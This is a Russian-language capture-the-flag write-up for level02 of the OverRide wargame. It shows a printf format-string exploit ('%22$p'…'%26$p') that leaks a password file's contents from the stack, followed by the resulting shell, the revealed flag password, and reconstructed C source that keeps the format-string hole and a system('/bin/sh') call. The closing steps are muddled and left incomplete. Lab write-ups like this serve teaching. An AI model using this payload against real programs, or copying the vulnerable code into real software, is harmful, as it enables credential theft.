# LEVEL 02

## Команды и ресурсы
gdb

## Уязвимость
printf format string

## Решение
1. Пробуем запустить:
```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: tanya
--[ Password: ttttt
*****************************************
tanya does not have access!
level02@OverRide:~$ 

```
- Программа ждет ввода логина и пароля, при неверном вводе выходит.

2. Пробуем посмотреть в отладчике. Полный код дизассемблирования [тут](resources/disas.md)

- В мейне есть три переменных-буфера:
- буфер1  - -0x70(%rbp)  - (username - хранит вводимый пользователем username) 
- буфер2  - -0xa0(%rbp)  - (password - хранит пароль, который считывается из файла /home/users/level03/.pass)
- буфер3  - -0x110(%rbp) - (user_pass - хранит вводимый пользователем пароль)

в случае совпадения 41 символов паролей - программа запускает system("/bin/sh") 

в случае несовпадения выводит на печать username через незащищенный вызов printf(username)
и завершает работу.

3. Попробуем воспользоваться уязвимостью форматной строки и вывести на печать пароль (напечатаем стек и наш буфер с паролем из файла).

Нам нужно определить на какой позиции в аргументах printf (условных) находится наш буфер с паролем из файла
попробуем вывести на печать

посчитаем, насколько отстоит буфер с хранимым паролем от буфера с вводимым паролем
-0xa0 - (-0x110) = 272 - 160 = 112 (112/8 - на 14 аргументов printf)

попробуем вывести на печать первые 10 аргументов printf:
```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaaaaaa %p %p %p %p %p %p %p %p %p %p
--[ Password: bbbbbbb
*****************************************
aaaaaaaa 0x7fffffffe500 (nil) 0x62 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x62626262626262 (nil) (nil) does not have access!

```
- пароль с введенным пользователем буфером (bbbbbbbb - 0x62626262626262) находится на 8 позиции, прибавим 14 = 22. По логике буфер с паролем из файла находится на 22 позиции
Буфер с паролем занимает 41 байт (40 + \n), получается нам нужно вывести на печать 5 аргументов (40 / 8 = 5) начиная с 22

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: a
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!

```

Теперь нам нужно превратить эту строку из hex в пароль в виде символов не забывая про little endian
Скрипт для дешифровки [тут](resources/decode.py)

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: tanya
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, tanya!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

```

## Воссоздадим бинарный файл
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    char username[100] = {};
    char password[41] = {};
    char user_pass[100] = {};
    FILE *file = NULL;
    int pass_len = NULL;

    file = fopen("/home/users/level03/.pass", "r");
    if (file == NULL) {
        fwrite( "ERROR: failed to open password file\n", 1, 36, stderr);
        exit(1);
    }

    pass_len = fread(password, 1, 41, file);
    password[strcspn(password, "\n")] = '\0';

    if (pass_len != 41) {
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        exit(1);
    }
    fclose(file);
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username: ");

    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = '\0';
    printf("--[ Password: ");
    fgets(user_pass, 100, stdin);
    user_pass[strcspn(user_pass, "\n")] = '\0';
    puts("************************************************");

    if (strncmp(password, user_pass, 41) == 0) {
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
        return 0;
    }

    printf(username);
    puts(" does not have access!");
    exit(1);
}
```


## Переносим на виртуальную машину, компилируем, проверяем
1. Копируем на виртуальную машину
``` bash
 scp -P 4242 ~/42/override/level02/source.c level02@192.168.56.129:/tmp/source_level02.c
 ```

2. заходим под level03 на виртуальную машину
```bash
su level03
```

3. Компилируем

```bash
cd /tmp
gcc -fno-stack-protector -z norelro -z execstack source_level02.c -o level02
```
```bash
level02@OverRide:/tmp$ checksec --file level01
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01

```

4. Меняем права
```bash
level02@OverRide:/tmp$ chmod u+s level01; chmod +wx; chmod +s; level01;

```
5. Возвращаемся в юзера level02 и Запускаем
```bash
level02@OverRide:/tmp$ exit


```
6. Проверяем уязвимость
```bash

```
